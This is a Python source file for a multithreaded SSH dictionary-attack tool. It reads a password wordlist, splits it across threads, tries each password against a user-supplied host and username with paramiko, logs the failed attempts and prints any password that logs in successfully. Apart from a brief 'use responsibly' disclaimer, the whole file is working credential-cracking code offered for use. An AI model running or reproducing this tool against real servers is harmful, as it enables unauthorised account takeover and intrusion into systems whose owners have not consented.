import paramiko, sys, time, os, logging #Imports necessary libraries
##from pexpect import pxssh #Imports required pexpect module
from threading import Thread #Imports threading library

threads = [] #List of threads

logFileName = 'attack '+time.strftime("%Y%m%d-%H%M%S")+'.log' #Name of log file containing timestamp
#Logging configuration
logging.basicConfig(filename=logFileName,level=logging.WARNING, format='%(asctime)s %(message)s', datefmt='%I:%M:%S %p')

#A function to test the server's connection before attempting to crack the password
def testConnection():
    print('\n[+] Testing connection to ' + target + ':' + str(port))
     # Create client and auto-add key to prevent printing of host key policy warning
    ssh = paramiko.client.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Attempt a connection with user supplied to check if server is alive
    try: 
        ssh.connect(target, port=int(port), username=user, password='')

    except paramiko.ssh_exception.NoValidConnectionsError as e: #Handles Connection Error
        ssh.close() #Closes SSH Connection
        logging.error(e) #Logs error
        sys.exit('\n[+] Connection to ' + target + ' was unsuccessful (the host is possibly down)\n[+] Exiting...\n')
    except TimeoutError as e: #Handles timeout error
        ssh.close()
        logging.error(e)
        sys.exit('\n[+] Connection to ' + target + ' was unsuccessful (the host is possibly down)\n[+] Exiting...\n')
    except paramiko.AuthenticationException: #Connection was probably successful but with wrong password
        ssh.close()
        logging.info('Connection to ' + target + ' was successful')
        print('\n[+] Connection to ' + target + ' was successful')
        pass
    except paramiko.SSHException as e: #Handles SSH exceptions
        logging.error(e)
        sys.exit('\n[+] Unable to establish SSH connection\n\n[+] Exiting...\n')
    except Exception as e: #Handles any other exceptions
        logging.error(e)
        sys.exit('\n[+] Unable to establish SSH connection\n\n[+] Exiting...\n')
    else: #If the connection was successful with no password
        logging.info('Connection to ' + target + ' was successful, no password was needed.')
        sys.exit('\n[+] Connection to ' + target + ' was successful, no password was needed.')


###Function to connect to server, ip, username and port are global variables. Password is passed through each time
def connect(password):
    # Create client and auto-add key to prevent printing of host key policy warning
    ssh = paramiko.client.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    while True: #Tries password again if SSH exception is thrown, happens when too many threads are requesting to connect
        # Attempt connection with user supplied password provided
        try: 
            ssh.connect(target, port=int(port), username=user, password=password)

        except paramiko.AuthenticationException: # If password does not match
            logging.warning('Incorrect password: ' + password) #Logs incorrect password
            ssh.close()
            break
        except paramiko.SSHException:
            continue # When too many threads are working it, an SSH exception is thrown and password needs to be tried again
        except Exception as e: #Handles all other exceptions
            logging.error(e)
            print('\n[+] Oops! Something went wrong, check log for info.\n[+] Exiting...\n')
            os._exit(0)
        # If the try block runs without any errors, the else runs meaning a valid password has been found.
        else:
            logging.critical('Password found in %s seconds' % (time.time() - start_time) + '\n' + user + '@' + target + ':' + str(port) + ' Password: ' + password)
            print('\n[!] Password found! ' + user + '@' + target + ':' + str(port) + ' Password: ' + password + '\n') #Prints password
            print("--- %s seconds ---" % (time.time() - start_time)) #Time elapsed
            ssh.close() #Terminates SSH connection
            os._exit(0)

#Function to test the programme using pexpect, don't forget to uncomment the import line!
##def connect(password):
##    s = pxssh.pxssh() #Creates object
##    try:
##        s.login(target, user, password, port=port) #Attempts to log in with given password
##        s.logout() #If no exceptions were thrown (login successful) logs out
##    except pxssh.ExceptionPxssh:
##        pass
##    else:
##        print('\n[!] Password found! ' + user + '@' + target + ':' + str(port) + ' Password: ' + password + '\n') #Prints password
##        print("--- %s seconds ---" % (time.time() - start_time)) #Time elapsed
##        os._exit(0)

        
			
#Help function to explain how the program works which runs in case of wrong args
def help():
    print("\nWelcome to Python SSH dictionary attack.\nPlease use responsibly and in a lawful matter")
    print("Usage: SSHcrack user target dictionary port(optional) threads(optional, default=9)\n Example: SSHcrack root 192.168.1.123 passlist.txt")
    sys.exit('[+] Exiting...\n')

#Function to slice the word list into ranges for each thread to work on
# Also, this functions assigns each range to a thread
def slice_it(li, cols):
    start = 0
    for i in range(cols):
        stop = start + len(li[i::cols])
        t = Thread(target = cracker, args = (start, stop, i,))
        threads.append(t)
        start = stop

#Sets all threads as daemon, starts them and then joins them.
def start_threads():
    for thread in threads:
        thread.setDaemon(True)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

#Worker (thread) that tests each password in a certain range, includes thread no
def cracker(x, y, tNum):
    global count, pwList
    for password in pwList[x:y]:
        count += 1
        #print(tNum, '[-] Attempt ' + str(count) + ': ' + password + ' ...') #Shows which password is being tested
        connect(password) #Sends password to connection function

def main():
    global target, port, user, dictionary, start_time, count, pwList #Global variables
    print("\nWelcome to Python SSH dictionary attack.\nPlease use responsibly and in a lawful matter")

    #Handles arguments
    if (sys.argv[1] == '--help' or sys.argv[1] == '-h'):
        help()
    elif(sys.argv[1] == '' or sys.argv[2] == '' or sys.argv[3] == ''):
        print('\n[+] Missing argument')
        help()      
    if(len(sys.argv) >= 5):
        port = sys.argv[4]
    else:
        port = 22

    if(len(sys.argv) >= 6):
        tCount = sys.argv[5] #No of threads
    else:
        tCount = 9
    dictionary = sys.argv[3]
    target = sys.argv[2]
    user = sys.argv[1]

    #Logs target, username and port
    logging.warning('Cracking ' + user + '@'+target +':'+ str(port))
    print('\n[+]Cracking ' + user + '@'+target +':'+ str(port))
    
    # Imports wordlist file into a list
    dic = open(dictionary, 'r')
    pwList= list()
    count = 0
    for line in dic.readlines():
        pwList.append(line.rstrip())
    dic.close()
    
    testConnection() #Function to test connection
    start_time = time.time() #Starts timer
    print("\n[+] Password cracking started at " + str(time.ctime())) #Prints starting time and date
    slice_it(pwList, int(tCount)) #Creates threads and specifies ranges for each threads
    start_threads() #Sets threads as daemons, starts them and then joins them.
    
    # If unsuccessful, print tip and unlucky message and exit
    print('\n[+] No Match Found\n[!] Try again with a larger dictionary or check username\n')
    sys.exit('[+] Exiting...\n')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("[+] Attack suspended by user...\n")
